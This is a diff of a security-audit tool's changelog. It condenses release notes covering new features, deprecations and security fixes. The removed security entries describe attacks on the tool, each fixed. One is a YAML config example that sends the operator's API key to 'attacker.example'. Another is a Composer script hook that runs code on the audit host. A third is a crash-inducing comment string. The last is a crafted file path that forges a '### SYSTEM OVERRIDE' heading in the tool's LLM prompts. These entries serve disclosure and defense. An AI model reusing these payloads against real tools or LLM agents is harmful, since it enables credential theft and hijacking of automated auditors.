-  understating a DELETE-only admin route's actual method restriction to the
-  attacker/reviewer prompt and the access-control map. Position 6 now resolves
-  to `methods` as well.
-
-### Security
-
-- **Secret scrubbing now redacts `Authorization: Basic` credentials and Slack
-  app-level tokens.** `RegexSecretScrubber::DEFAULT_PATTERNS` covered
-  `Authorization: Bearer` but not `Basic`, so a committed
-  `Authorization: Basic <base64>` — which decodes straight back to
-  `user:password` — was sent verbatim to the configured LLM provider on the
-  default `scan.secret_scrubbing.enabled` path. The same gap applied within a
-  provider already covered: `xox[abprs]-` tokens and `hooks.slack.com` webhook
-  URLs were redacted while Slack's `xapp-` app-level tokens were not. Both are
-  now matched, and the Basic pattern keeps the header name and scheme
-  (`Authorization: Basic ***REDACTED:basic_authorization***`) so the audit can
-  still see that the request authenticates and how. The pattern requires the
-  header or an assignment before the credential, so prose such as "use basic
-  authentication over TLS" is left alone. `SecretPatternLabel` gains
-  `BasicAuthorization`.
-- **A finding's `file` path could forge a fake section header in the PoC and fix
-  synthesis prompts.** `PoCSynthesizer::buildUserMessage()`
-  (`src/Audit/Application/Agent/PoCSynthesizer.php`) and
-  `FixSynthesizer::buildUserMessage()` escape every other narrative field —
-  `title`, `vulnerable_code`, `attack_vector`, `proof`, `remediation` — with
-  `escapeFences()` so a run of backticks or `#` can't forge a fake code fence or
-  a bogus `### SYSTEM OVERRIDE` heading, but `file` (attacker-controlled via
-  `record_vulnerability`'s unconstrained `file_path` input) only had its
-  newlines stripped. Both now also escape `file` through `escapeFences()`.
+- PoC and fix synthesis prompts escape a finding's `file` path like every other field, so a crafted path cannot forge a section header ([#345](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/345))
+- `docs/architecture.md`'s exit-code and `--format` summary matches the canonical table in `docs/configuration.md` ([#343](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/343))
 
 ## [1.19.1] — 2026-08-13 — Lineage
 
-A release about the release process itself. A past release (PR #305) merged
-`1.x` into `main` with a rebase instead of a regular merge commit, silently
-duplicating 41 commits under new SHAs and letting `auto-release.yaml` evolve
-differently on each branch afterward. This release reconciles the two branches
-properly and adds the CI check that would have caught the original mistake.
+### Core 🧱
 
-### Fixed
-
-- **A rebase-merged release once duplicated `1.x`'s commits onto `main` under
-  new SHAs, and the divergence kept growing unnoticed.** `docs/versioning.md`
-  already names the cause: PR #305 rebase-merged a release instead of using a
-  regular merge commit, replaying `1.x`'s commits onto `main` with fresh hashes.
-  Comparing every commit since by content (`git patch-id`) confirms it: 41
-  commits on `1.x` and `main` are byte-identical changes under different SHAs.
-  Afterward, `.github/workflows/auto-release.yaml` was edited separately on each
-  branch rather than ported across — `main`'s copy fell behind `1.x`'s by a
-  manual-replay `workflow_dispatch` trigger, an optional `publish` input, and
-  the binary-build dispatch step, while `CLAUDE.md`, `docs/versioning.md`, and
-  `commitlint.config.mjs`'s `release` commit scope documenting the regular-merge
-  rule itself never reached `main` at all. This release merges `1.x` into `main`
-  with a proper merge commit, so both branches share the same history from here
-  on, and `auto-release.yaml`'s `detect` job now verifies any push-triggered
-  release commit is a genuine two-parent merge whose second parent is an
-  ancestor of `1.x` — failing the workflow loudly instead of silently accepting
-  a squash- or rebase-merge.
+- The release workflow verifies that a push-triggered release commit is a genuine merge commit whose second parent is on `1.x`, and fails loudly on a squash- or rebase-merge; `main` and `1.x` are reconciled with a proper merge ([#321](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/321))
 
 ## [1.19.0] — 2026-08-12 — Bulwark
 
-A release about seeing a result without leaving GitHub. The attacker now also
-flags XSSI "JSON Hijacking": a `GET` endpoint returning a bare top-level JSON
-array instead of an object, exploitable via a cross-origin `<script src>`
-include. `--format=github-comment` posts a run's summary straight to the pull
-request, an opt-in badge input reports a project's grade on shields.io, and
-every report now carries a normalized 0-100 score and `A`-`F` grade beside the
-existing risk level, with `--min-score` to gate CI on it directly. Alongside
-that: an audited project could execute code on the host via its own Composer
-scripts, or redirect the standalone binary's LLM connection — and the operator's
-API key — to an attacker's endpoint; both are now closed. Secret-scrubbing also
-catches several previously-missed credential shapes (Azure Storage keys,
-`Authorization: Bearer` headers, OpenAI-style keys, Slack webhooks), and a
-handful of cache/dedup-key hashing bugs that could replay a stale verdict or
-silently drop a finding are fixed.
+### New Features ✨
 
-### Added
+- The attacker detects XSSI "JSON Hijacking": a `GET` endpoint returning a bare top-level JSON array instead of an object, exploitable through a cross-origin `<script src>`; new `json_hijacking` finding type (CWE-200, OWASP A01:2025), not flagged on routes that exclude `GET` ([#284](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/284))
+- Every report carries a normalized 0-100 score and an `A`-`F` grade next to the risk level (`A` safe, `B` low, `C` medium, `D` high, `F` critical); `--format=json` gains the root keys `score` and `grade`, and the executive summary shows both ([#262](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/262))
+- `audit:run --min-score=<0-100>` exits `1` when the score falls below the threshold, independently of `audit.fail_on`; the GitHub Action mirrors it as the `min-score` input ([#263](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/263))
+- The GitHub Action can write a shields.io badge endpoint file with the report's grade (opt-in `update-badge` input, `badge-path` input, `grade` and `badge-path` outputs); committing the file stays up to you ([#264](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/264))
+- `--format=github-comment` renders the grade, score and ten most severe findings as a pull request comment body, and the Action's opt-in `comment-pr` input posts it and edits it in place on each push, with a `comment-url` output ([#265](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/265))
+- The Action's `comment-pr` step only edits comments authored by `github-actions[bot]`, so a pull request commenter can no longer hijack the report comment by posting its marker first ([#290](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/290))
+- The standalone binary rejects a project `.symfony-security-auditor.yaml` that declares `platform` or `provider`, naming the file and keys, so an audited repository cannot redirect the LLM connection and your API key to its own endpoint; `doctor` reports the same failure and connection settings come from the user config only ([#278](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/278))
+- The standalone binary rejects a project `.symfony-security-auditor.yaml` that declares `scan.import_sarif`; configure SARIF imports in the user config instead ([#304](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/304))
+- `scan.included_paths` entries that resolve outside the audited project root are skipped with a warning instead of being read and sent to the LLM provider ([#304](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/304))
+- `scan.custom_risk_patterns` are validated at startup (an empty or invalid pattern throws `InvalidCustomRiskPatternException`), and a pattern that fails at runtime logs a warning and stops running for the rest of the file ([#304](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/304))
+- Secret scrubbing fails closed: a file the scrubber cannot finish scanning is replaced by `***REDACTED:unscannable***`, keeping its line count, with a warning naming the pattern ([#280](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/280))
+- Secret scrubbing redacts `aws_secret_access_key`, `secret_key_base`, `client_secret_value` and `private_key_path` in YAML, PHP-array and JSON form as it already did in dotenv form, and recognizes `PASSPHRASE` as a credential word ([#280](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/280))
+- Secret scrubbing redacts Azure Storage connection strings (`AccountKey=`), `Authorization: Bearer` headers, OpenAI-style `sk-` and `sk-proj-` keys, and Slack incoming webhook URLs ([#303](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/303))
 
-- **`FrameworkVocabulary` lifts the framework wording out of the synthesizer
-  prompt literals.** `PoCSynthesizer` and `FixSynthesizer` are portable in every
-  respect except their prompts, which named Symfony directly: "confirmed Symfony
-  vulnerabilities" and "Twig SSTI / XSS"
-  (`src/Audit/Application/Agent/PoCSynthesizer.php`), "senior Symfony security
-  engineer" and a hard-coded "parameterized Doctrine query, `#[IsGranted]`, …"
-  idiom list (`src/Audit/Application/Agent/FixSynthesizer.php`). That wording
-  was the only thing pinning two otherwise framework-neutral classes to Symfony.
-  The new `Audit\Domain\Model\FrameworkVocabulary` carries the framework's
-  `name`, the name of its `templateLanguage` and the `idiomaticFixes` a patch
-  should prefer over a hand-rolled guard; both synthesizers accept one as an
-  optional fourth constructor argument and interpolate it into their system
-  prompts. The default describes Symfony, so every existing caller — including
-  the container wiring in `config/services.php`, which is unchanged — produces
-  the same prompts it did before. Auditing a non-Symfony PHP application no
-  longer requires forking either class.
+### Deprecations 💀
 
-- **`ApplicationSecurityMap` names the project survey after what each surface
-  _is_.** `SymfonyMapping` is a BC-covered Domain model whose name and most of
-  its 19 accessors hard-code Symfony vocabulary (`voterCapabilities()`,
-  `controllersWithoutVoters()`, `firewallRules()`, `hasVoterForEntity()`), and
-  it leaked into orchestration: `DependencyExpansionStage` guarded on
-  `instanceof SymfonyMapping` and `AuditContext` typed its property against it.
-  The new `Audit\Domain\Model\ApplicationSecurityMap` exposes the same data as
-  `entrypoints()`, `authorizationRules()`,
-  `entrypointsWithoutAuthorizationRule()`, `perimeterRules()`,
-  `hasAuthorizationRuleForModel()` and neutral equivalents of the rest.
-  `SymfonyMapping` now delegates to it and offers `toApplicationSecurityMap()`;
-  `AuditContext` gains `securityMap()` while `mapping()` keeps its signature
-  untouched, so nothing existing breaks. `DependencyExpansionStage` reads the
-  neutral map exclusively and no longer names a Symfony type.
+- `SymfonyMapping::voterCapabilities()`, `firewallRules()`, `controllersWithoutVoters()` and `hasVoterForEntity()` are deprecated, in favour of `authorizationRules()`, `perimeterRules()`, `entrypointsWithoutAuthorizationRule()` and `hasAuthorizationRuleForModel()` on `ApplicationSecurityMap` (via `SymfonyMapping::toApplicationSecurityMap()`); the rest of `SymfonyMapping` stays until the next major ([#267](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/267))
 
-- **The attacker now detects XSSI "JSON Hijacking" on GET endpoints.** Per the
-  [Symfony `JsonResponse` documentation](https://symfony.com/doc/current/components/http_foundation.html#creating-a-json-response),
-  a `GET` action that returns a bare top-level indexed JSON array (e.g.
-  `[{...}, {...}]`) instead of an object (`{"data": [...]}`) is exploitable via
-  a cross-origin `<script src="...">` include, since only `GET` requests can be
-  triggered that way. `ControllerAttackerSkill`
-  (`src/Audit/Infrastructure/Prompt/Skill/`) now hunts for this pattern and
-  explicitly does not flag it on routes whose `methods:` exclude `GET`. New
-  `VulnerabilityType::JSON_HIJACKING` case (`src/Audit/Domain/Model/`), mapped
-  to CWE-200 (it leaks data cross-origin rather than forging a state-changing
-  request, so CWE-352's request-forgery framing doesn't fit) and OWASP A01:2025
-  (Broken Access Control) alongside the existing CSRF and SSRF variants.
-  `AttackerPromptBuilder` and `ReviewerPromptSections`
-  (`src/Audit/Infrastructure/Prompt/`) list `json_hijacking` among the valid
-  `type`/`corrected_type` values so both agents can name it.
+### Bugfixes 🐛
 
-### Deprecated
+- `audit:run`: an audit that examined no files (mistyped `project-path`, `scan.included_paths` matching nothing, an over-broad `excluded_paths`) exits `1` instead of reporting SAFE, score 100, grade A and exit `0`; `AuditReport::filesDiscovered()` exposes the count ([#288](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/288))
+- `audit:run`: a failing `--min-score` gate no longer blames the `--fail-on` threshold; the message now reads `Audit failed a configured gate. Risk: %s. Score: %d/100.` ([#276](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/276))
+- `audit.budget.max_tokens` counts cache read and cache creation tokens as well as input and output, so a caching-heavy run can no longer pass the cap unnoticed; the cap may trip earlier than before ([#288](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/288))
+- Attacker chunk cache entries no longer outlive the security mapping (`security.yaml` access control, voters, routes, forms) they were computed under; a custom `AttackerCacheInterface` that is not context-aware will see chunks skipped more often ([#288](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/288))
+- `record_vulnerability` requires `line_start`, so a finding that omitted it can no longer overwrite an unrelated finding of the same type in the same file ([#288](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/288))
+- Finding ids (`VULN-…`) no longer collide when a digit can move between the file path and the start line ([#292](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/292))
+- A purely numeric `file_path` no longer crashes `audit:run --format executive` with a `TypeError` ([#289](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/289))
+- Finding titles and file paths are sanitized against forged prompt sections (carriage returns stripped from attacker, reviewer and Symfony-mapping prompts) and against bidirectional overrides in SARIF and JUnit reports, even when the title also holds invalid UTF-8 ([#289](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/289))
+- `audit:run --since` no longer executes commands defined by the audited repository's git config (`core.fsmonitor`, or a `.gitattributes` clean filter); uncommitted changes are read with plumbing commands that never run a content filter ([#290](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/290))
+- The MCP `audit` tool resolves advisories, SARIF imports and triage cache entries against the audited project instead of the bundle directory, and rejects a non-absolute `path` ([#290](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/290))
+- A negative token count from the LLM provider can no longer defeat the configured rate limit for the rest of its window ([#291](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/291))
+- Standalone configuration resolves `%env(...)%` placeholders outside the `platform` block, so `model: '%env(SSA_MODEL)%'` no longer aborts ([#268](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/268))
+- Standalone binaries are published with releases again, after 1.18.0 shipped none because the static build rejected the polyfilled `ext-uri` requirement ([#229](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/229))
 
-- **Four `SymfonyMapping` accessors, in favour of `ApplicationSecurityMap`.**
-  `voterCapabilities()` → `authorizationRules()`, `firewallRules()` →
-  `perimeterRules()`, `controllersWithoutVoters()` →
-  `entrypointsWithoutAuthorizationRule()`, `hasVoterForEntity()` →
-  `hasAuthorizationRuleForModel()`. Each still returns exactly what it did and
-  now emits a `trigger_deprecation`, following the `of()`/`create()` precedent
-  set in 1.13. The rest of `SymfonyMapping` — and `AuditContext::mapping()` — is
-  **not** deprecated and works unchanged for all of `1.x`; removing the class is
-  the `MAJOR` step. Every in-tree caller already moved, so the suite runs clean
-  under `failOnDeprecation`.
-- **`SurfaceArchetype` gives every scanned file a framework-neutral shape.**
-  `ProjectFileType` is a closed enum of 21 Symfony concepts (`VOTER`,
-  `TWIG_EXTENSION`, `SONATA_ADMIN`, `MESSENGER_HANDLER`, …) and it is
-  load-bearing: 193 references across 42 files in `src/`. A PHP enum cannot be
-  extended, so that taxonomy is the single biggest obstacle to reusing the
-  pipeline for a second framework. The new `Audit\Domain\Model\SurfaceArchetype`
-  describes what a file _does_ — `HTTP_ENTRYPOINT`, `AUTHORIZATION_RULE`,
-  `AUTHENTICATION`, `DOMAIN_MODEL`, `PERSISTENCE_QUERY`, `INPUT_BINDING`,
-  `ASYNC_HANDLER`, `EVENT_HOOK`, `SERIALIZATION`, `TEMPLATE`, `CONFIG`, `OTHER`
-  — and `ProjectFileType::archetype()` maps every case onto exactly one, with
-  `ProjectFile::archetype()` as the accessor. Core logic can now switch on the
-  shape without naming a Symfony concept, while prompts and skill lookup keep
-  the precise type. No case was removed or renamed, so this is purely additive.
-  `ProjectFileType::isControllerLike()` now delegates to `HTTP_ENTRYPOINT`,
-  which is deliberately narrow — a _route-guarded_ action surface. A webhook
-  consumer receives a request but is invoked by the webhook transport rather
-  than a route, so it is an `ASYNC_HANDLER`; widening `HTTP_ENTRYPOINT` would
-  silently change which files reach the access-control and form-binding maps,
-  and a test asserts the two sets stay identical.
+### Core 🧱
 
-- **`--format=github-comment` and an opt-in `comment-pr` action input post the
-  audit summary to the pull request.** Reviewers had to open the Actions log or
-  download the report artifact to see a result. The new format renders a body
-  sized for a comment rather than a full report: the grade and normalized score
-  as a headline, the run on one line, and the ten most severe findings
-  (`GithubCommentReportRenderer::MAX_ROWS`) as one table row each, with a note
-  naming how many the cap left out so a large report cannot approach GitHub's
-  comment length limit. The body opens with an invisible
-  `<!-- symfony-security-auditor:pr-comment -->` marker, which is how
-  `action.yml`'s new `comment-pr` input (default `false`) finds its own previous
-  comment and `PATCH`es it in place instead of appending one per push; a
-  `comment-url` output names the comment it touched. Like the badge step it runs
-  under `if: always()`, since a run that trips the `fail-on` gate is the one
-  reviewers most need summarized, and it warns and exits 0 — rather than failing
-  the job over a comment — when the format is wrong, no report file exists, or
-  no `GITHUB_TOKEN` was passed. `MarkdownReportRenderer`'s Markdown-injection
-  defenses moved to a shared `MarkdownTextEscaper` so the new renderer inherits
-  them instead of restating them, and it gained `tableCell()` — a `|` or a
-  newline in an LLM-authored finding title would otherwise forge extra table
-  columns or rows.
-- **The GitHub Action can emit a shields.io badge endpoint.** Consumer repos had
-  no lightweight visual indicator of audit status — the only way to see a result
-  was to open the Actions log or download the report artifact. `action.yml`
-  gains an opt-in `update-badge` input (default `false`) and a `badge-path`
-  input (default `.github/security-auditor-badge.json`); when enabled on a
-  `push` event, it writes a
-  [shields.io endpoint](https://shields.io/badges/endpoint-badge) JSON file
-  whose `message` is the report's grade and whose `color` follows it (`A`
-  brightgreen … `F` red). The action **only writes the file** — committing it
-  stays the caller's decision, so the action never pushes to a consumer's
-  repository on their behalf. The badge step runs under `if: always()`, because
-  the audit step exits `1` when it trips the `fail-on` gate and that is
-  precisely the run whose grade must reach the badge; without it the badge would
-  keep showing the last passing grade. `action.yml` also gains a `grade` output
-  beside the existing `highest-severity`, and a `badge-path` output naming the
-  file it wrote.
-- **`audit:run --min-score` gates CI on one tunable number.** `--fail-on` gates
-  on severity buckets, so ratcheting a project's bar upward meant reasoning
-  about which bucket to move to and accepting the whole step change that came
-  with it. `--min-score=<0-100>` makes `audit:run` exit `1` when
-  `AuditReport::normalizedScore()` falls below the threshold, so a team can
-  raise the bar one point at a time. It is a second, **independent** gate:
-  `AuditExitCodeResolver::resolve()` fails the run when either the risk level
-  reaches `audit.fail_on` **or** the score falls below `--min-score`, and
-  omitting the option leaves the risk level as the only gate. `action.yml`
-  mirrors it as the `min-score` input. The standalone binary exposes it too,
-  since it shares the same `audit:run` definition.
-- **A report now carries a normalized 0-100 score and an `A`-`F` grade.**
-  `AuditReport::riskScore()` is an unbounded weighted sum, so it grows with
-  every finding and has no ceiling to render against — awkward in a badge, a
-  pull-request comment or a numeric CI gate, all of which need a bounded number.
-  `AuditReport::normalizedScore()` starts at `100` and deducts each finding's
-  `VulnerabilitySeverity::score()` weight, floored at `0`; reusing that one
-  weight table is what keeps the two scales from drifting apart when a severity
-  case changes. `AuditReport::grade()` returns the new
-  `Audit\Domain\Model\SecurityGrade` enum (`A`…`F`), whose boundaries mirror the
-  `riskLevelEnum()` thresholds — `A` is `safe`, `B` is `low`, `C` is `medium`,
-  `D` is `high`, `F` is `critical` — so a report can never read as a healthy
-  grade while its risk level says otherwise. `--format=json` gains the additive
-  root keys `score` and `grade`, and `ExecutiveSummary` carries
-  `normalizedScore` and `grade` beside its existing `riskScore`. `risk_score`
-  and `risk_level` are untouched, so this is purely additive.
-- **The installers and the config schema are published as release assets.**
-  `README.md` pointed users at
-  `raw.githubusercontent.com/vinceAmstoutz/symfony-security-auditor/main/install.sh`,
-  and the `# $schema:` modelines in `examples/configs/*.yaml` and
-  `docs/configuration.md` at `main/resources/schema.json` — so every install ran
-  whatever sat on the development branch, and editors autocompleted config keys
-  from it. Because `AuditConfigurationDefinition` does not call
-  `ignoreExtraKeys()`, a key documented before its release makes the audit abort
-  with `InvalidConfigurationException`, and standalone is not spared:
-  `BundleExtensionLoader` loads the same extension the bundle configures.
-  `.github/workflows/release.yaml` gains an `installers` job attaching
-  `install.sh`, `install.ps1` and `resources/schema.json` to each release. The
-  documented URLs still point at `main` for now: `releases/latest/download/`
-  resolves to the newest _published_ release, so it only answers once a release
-  carries these assets. Repointing them is a follow-up, to be done after this
-  job has run — otherwise the documented install command would 404, which is the
-  very breakage this prepares to fix.
-- **A documented branch policy that keeps `main` at the released version.**
-  `docs/versioning.md` defined the BC promise but said nothing about branches,
-  so documentation on the default branch drifted ahead of the newest tag for as
-  long as a release took to prepare — and since `AuditConfigurationDefinition`
-  rejects an unknown key outright, a reader could follow it into
-  `InvalidConfigurationException`. `main` now holds **exactly the latest
-  release**: development happens on `1.x`, breaking work for the next `MAJOR` on
-  `2.x`, and `main` only ever receives a release merge. Everything the default
-  branch documents is therefore installable. `CONTRIBUTING.md` gains the
-  matching branch table and keeps the _Since X.Y_ marking convention so a reader
-  can still tell which release introduced a key.
-- **The pull-request template declares a target, and CI enforces it.** A
-  contributor had no prompt to state a change's impact, and since a pull request
-  opens against the default branch it would land on `main` by default — the one
-  branch that should only receive release merges.
-  `.github/PULL_REQUEST_TEMPLATE.md` gains a `## Target branch` section listing
-  the branches themselves — `1.x`, `2.x`, `main` — rather than SemVer impacts,
-  so there is one question on one axis and no two options that mean the same
-  thing. The new `Pull request target` workflow
-  (`.github/workflows/pr-target.yaml`) fails the build when the template
-  sections are missing, when no box or several are ticked, or when the ticked
-  branch disagrees with the base the pull request was opened against — so a
-  mistargeted branch is caught before review rather than after merge. It matches
-  any `<N>.x` branch, so it needs no edit when a major rolls, and it reads only
-  the event payload, so it needs no checkout, no `uses:` and no permissions.
-
-### Changed
-
-- **`RegexCodeSlicer` (`src/Audit/Infrastructure/Scan/`) split from one 465-line
-  class into eight single-responsibility collaborators.** `StringLiteralMasker`
-  neutralizes string-literal content; `SecurityRelevantLineClassifier` decides
-  structural/security-token retention; `BlockCommentStripper` and
-  `ParenContinuationTracker` track block-comment and paren-continuation state
-  across lines; `HeredocLineTracker` retains a heredoc/nowdoc body verbatim.
-  Retention itself is now a `LineRetentionDeciderInterface`, with
-  `ContinuationForcedLineRetentionDecider` decorating
-  `SecurityRelevantLineClassifier` so a line that continues an open construct is
-  retained regardless of the base classifier's verdict — replacing an inline
-  three-way boolean OR in `slice()`. `RegexCodeSlicer` itself is now a 93-line
-  orchestrator. Purely internal (`@internal`, not part of the BC promise);
-  identical output for every existing case.
-
-- **CI now runs on version branches.** `.github/workflows/ci.yaml` triggered on
-  pushes to `main` only, so a commit pushed straight to a next-`MAJOR` branch
-  like `2.x` would ship without the test matrix, PHPStan, Deptrac or Infection
-  ever running. The push trigger now also matches `[0-9]+.x`.
-
-### Removed
-
-- **`extra.branch-alias` is gone from `composer.json`.** It declared
-  `{"dev-main": "1.0.x-dev"}` while the project was at 1.18.0 — wrong for
-  eighteen `MINOR` releases, because `bin/castor release:bump` never touched it
-  and nothing else read it. Its only effect was letting a dev version satisfy a
-  numeric constraint such as `^1.19@dev`; requiring a branch directly
-  (`composer require vinceamstoutz/symfony-security-auditor:dev-1.x`) works
-  without it, and nothing depends on this package with a version constraint
-  since it installs as a dev tool. Keeping it would have meant re-pinning it
-  every release to stop it rotting again, for a feature that had already proven
-  unused. `extra` held nothing else, so the whole key is removed. This is not a
-  BC break: `composer.json` metadata is not part of the public API surface in
-  [`docs/versioning.md`](docs/versioning.md).
-
-### Security
-
-- **The release pipeline's `static-php-cli` (`spc`) download is now
-  checksum-verified.** `release.yaml`'s `binary` job pinned `spc` only to a
-  mutable version _tag_ (`SPC_VERSION: '2.8.5'`) and executed it
-  (`./spc doctor`, `./spc build`, …) with no integrity check, unlike every other
-  third-party download in the same job — the `autopoint`/`re2c` `.deb` fallback
-  two steps later is already SHA-256-verified before `dpkg -i`, and every
-  `uses:` in the repo is commit-SHA pinned. A GitHub release asset attached to
-  an existing tag can be replaced without the tag changing, so a compromised
-  upstream release would be downloaded and executed by the very job that
-  produces the officially published binaries — and the checksum this job later
-  publishes alongside them is generated _after_ `spc` has already run, so it
-  would happily match a backdoored artifact. Each matrix platform's `spc` asset
-  now carries a pinned SHA-256 (`matrix.spc_sha256`), verified immediately after
-  download and before either extraction or execution.
-
-- **A crafted `title` or `filePath` could forge the baseline/CI-gate identity of
-  a real, unrelated finding.** `Vulnerability::fingerprintOf()`
-  (`src/Audit/Domain/Model/Vulnerability.php`) joined `type`, `filePath`, and
-  `title` with a bare `|` before hashing, so a `filePath` ending in `|Bar` and a
-  `title` of `Unsafe SQL query` produced the exact same input string — and
-  therefore the exact same `SSA-…` fingerprint — as a `filePath` of `src/Foo`
-  paired with the title `Bar|Unsafe SQL query`. Both `filePath` and `title` are
-  attacker-influenceable (a PR author picks their own filenames; findings'
-  titles are visible in prior JSON/SARIF reports and PR comments). Because this
-  fingerprint is the sole suppression key for `Baseline`, and
-  `AuditExitCodeResolver`'s `--fail-on`/`--min-score` CI gate is computed
-  **after** baseline suppression, one innocuous-looking baseline entry could be
-  engineered to also suppress a real, unrelated HIGH/CRITICAL finding sharing
-  the colliding fingerprint — a false SAFE at the CI-gating layer. `audit:diff`
-  and `audit:trend` inherited the same weakness through `fingerprint`-keyed
-  matching. Fixed the same way as `generateId()`'s equivalent bug: each field is
-  now hashed individually before being joined, so no delimiter-free
-  concatenation can shift a byte across a field boundary.
-
-- **A file with a long `$this->helper()` call chain could stall or exhaust
-  memory during mapping.** `ThisCallReachability::reachableBody()`
-  (`src/Audit/Infrastructure/Scan/ThisCallReachability.php`) recursed once per
-  helper call, copying a growing `visited` set and return-and-concatenating a
-  growing result array at every level — quadratic in the length of a
-  `$this->b1()->b2()->…` chain. A target-repo class with a few thousand such
-  methods (well under the 512 KiB per-file scan cap) took minutes instead of a
-  fraction of a second, and a longer chain exhausted PHP's memory limit outright
-  (reproduced directly: an 8,000-method chain fatal-errored on
-  `Allowed memory size … exhausted`). Rewritten as an explicit-stack depth-first
-  walk with a single shared `visited` set and result list, with identical output
-  and call order for every existing case — a 12,000-method chain now resolves in
-  well under a second.
-
-- **A single crafted PHP file could crash the entire audit process.**
-  `RegexCodeSlicer::stripBlockComments()`
-  (`src/Audit/Infrastructure/Scan/RegexCodeSlicer.php`) recursed once per
-  `/*`/`*/` pair found on a line, with no depth limit, and runs on every line of
-  every PHP file at or above `minLinesBeforeSlicing` (80 lines) up to the
-  scanner's 512 KiB per-file cap. A malicious target repo containing a file with
-  one line like `str_repeat('/**/', 20000)` — an 80 KB line, well under that cap
-  — blew the native C call stack and segfaulted the PHP process (reproduced
-  directly: `Segmentation fault (core dumped)`, exit code 139), killing
-  `audit:run` before it reported on the rest of the repository. No `try`/`catch`
-  in the pipeline can intercept a native stack overflow. `stripBlockComments()`
-  now strips same-line block comments iteratively instead of recursing, with
-  identical output for every existing case.
-
-- **A finding title can no longer ping an arbitrary GitHub account from a posted
-  pull-request comment.** `MarkdownTextEscaper::escapeStructuralMarkers()`
-  enumerated the Markdown-active characters it neutralizes (`` ` ``, `~`, `#`,
-  `<`, `>`, `[`, `]`) but omitted `@`, and GitHub autolinks a bare `@handle` in
-  a comment body into a live profile mention. A finding title is LLM-authored
-  from attacker-influenceable repository content, and `action.yml`'s
-  `comment-pr` step posts the rendered body verbatim with a
-  `pull-requests: write` token — so a crafted target project could notify any
-  GitHub user through the audited repository's own automation. `@` is now
-  HTML-entity-encoded as `&#64;`, the same treatment `<`/`>` already had, so it
-  renders as a literal `@` without triggering the mention.
-
-- **A file path containing `|` can no longer forge a column in the pull-request
-  comment table.** `MarkdownTextEscaper::inlineCode()` wraps text in a backtick
-  run, but GFM splits a table row on unescaped `|` _before_ inline parsing, so a
-  code span does not shield one — and `CodeLocation` accepts any non-blank
-  `filePath`, fed straight from LLM tool-call output with no character
-  allowlist. `GithubCommentReportRenderer` rendered the Location and Type cells
-  through `inlineCode()`, so a path like `src/Foo|Bar.php` corrupted the row a
-  reviewer reads to see validated findings. The new
-  `MarkdownTextEscaper::tableInlineCode()` backslash-escapes `|` and is used for
-  both cells; plain `inlineCode()` is unchanged, since `\|` renders literally in
-  a code span outside a table.
-
-- **An audited repository can no longer redirect the standalone binary's LLM
-  connection to an endpoint of its choosing.** The standalone CLI layers a
-  `.symfony-security-auditor.yaml` from the working directory over the user's
-  own `config.yaml`, and `StandaloneConfigLoader::load()`
-  (`src/Audit/Infrastructure/Config/StandaloneConfigLoader.php`) merged the two
-  files _before_ handing the result to `StandalonePlatformConfigResolver` — so
-  the project file could contribute `platform:` and `provider:` keys just like
-  any audit setting. Since `%env(...)%` placeholders are resolved from the
-  environment of the process running the audit, a repository shipping
-
-  ```yaml
-  provider: attacker
-  platform:
-      attacker:
-          api_key: '%env(ANTHROPIC_API_KEY)%'
-          base_url: 'https://attacker.example/collect'
-  ```
-
-  became the active platform on the next
-  `cd that-repo && symfony-security-auditor audit`, sending the operator's
-  resolved API key and every prompt — the audited source code — to the
-  attacker's endpoint. The documented contract was already the opposite ("the
-  API credentials stay in the shared user config"), it simply was not enforced.
-  `load()` now reads the project file through `readProjectConfig()`, which
-  rejects it outright with the new `ProjectConfigPlatformOverrideException` when
-  it declares `platform` or `provider`, naming the file and the offending keys;
-  connection settings are read from the user config only. The rejection is loud
-  rather than a silent drop, so a team pinning a local endpoint for everyone
-  finds out instead of quietly auditing through a cloud provider.
-  `symfony-security-auditor doctor` reports the same message as a failed
-  `Configuration` check. Project files that carry audit settings — chunking
-  strategy, `fail_on`, excluded paths — are unaffected.
-
-- **The audited project can no longer execute code on the audit host.**
-  `SymfonyProcessComposerAuditRunner::defaultProcessBuilder()` ran
-  `composer audit --format=json --locked --no-interaction` with the audited
-  project as the working directory, without `--no-scripts` or `--no-plugins`.
-  Composer dispatches the project's `pre-command-run` script and activates the
-  plugins in its `vendor/` for that command, so a repository carrying a
-  `composer.json` such as `"scripts": {"pre-command-run": "php -r \"…\""}`
-  obtained arbitrary command execution as the auditing user — reached on the
-  documented happy path, since `audit.tools_enabled` defaults to `true` and the
-  attacker agent's `lookup_advisory` tool triggers the advisory database.
-  Reproduced end to end: the hostile script ran and wrote its marker file, and
-  the `AdvisorySourceUnavailableException` the runner then raised was no
-  mitigation because the code had already executed. Both flags are now passed;
-  neither changes what `audit --locked` reports, since the advisory check reads
-  `composer.lock`. Users auditing an untrusted project with a release before
-  this fix should assume the project's Composer scripts ran.
-
-- **Secret scrubbing no longer ships content it could not finish scanning.**
-  `RegexSecretScrubber::scrub()`
